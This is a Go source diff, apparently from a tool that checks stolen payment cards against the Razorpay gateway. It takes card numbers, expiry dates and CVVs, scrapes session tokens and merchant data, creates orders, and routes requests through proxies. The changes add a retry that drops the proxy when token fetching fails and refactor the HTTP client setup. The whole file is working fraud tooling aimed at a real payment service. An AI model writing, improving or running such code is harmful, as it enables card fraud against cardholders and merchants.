@@ -6,7 +6,6 @@ import (
 	"io"
 	"math/rand"
 	"net/http"
-	"net/http/cookiejar"
 	"net/url"
 	"regexp"
 	"strings"
@@ -143,6 +142,22 @@ func fetchMerchantData(siteURL, origin string, amountPaise int, proxyURL string)
 var sessionTokenRe = regexp.MustCompile(`session_token[="\s:]+([a-zA-Z0-9_-]{20,})`)
 
 func fetchSessionToken(proxyURL string) (string, error) {
+	token, err := fetchSessionTokenViaProxy(proxyURL)
+	if err == nil {
+		return token, nil
+	}
+
+	if proxyURL != "" {
+		token2, err2 := fetchSessionTokenViaProxy("")
+		if err2 == nil {
+			return token2, nil
+		}
+	}
+
+	return "", err
+}
+
+func fetchSessionTokenViaProxy(proxyURL string) (string, error) {
 	client := newHTTPClient(proxyURL, 15*time.Second)
 
 	checkoutURLs := []string{
@@ -524,14 +539,7 @@ func checkRazorpayCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
 		}
 		fmt.Printf("[RAZ] card=%s step=merchant_data site=%s ok key_id=%s plid=%s ppi=%s amount=%d\n", card, site.URL, md.KeyID, md.PaymentLinkID, md.PaymentPageItem, md.AmountPaise)
 
-		jar, _ := cookiejar.New(nil)
-		transport := &http.Transport{TLSHandshakeTimeout: 10 * time.Second, DisableKeepAlives: true}
-		if proxyURL != "" {
-			if p, err := url.Parse(proxyURL); err == nil {
-				transport.Proxy = http.ProxyURL(p)
-			}
-		}
-		client := &http.Client{Transport: transport, Timeout: 30 * time.Second, Jar: jar}
+		client := newCookieClient(proxyURL, 30*time.Second)
 
 		orderID, err = createOrder(client, md)
 		if orderID != "" {
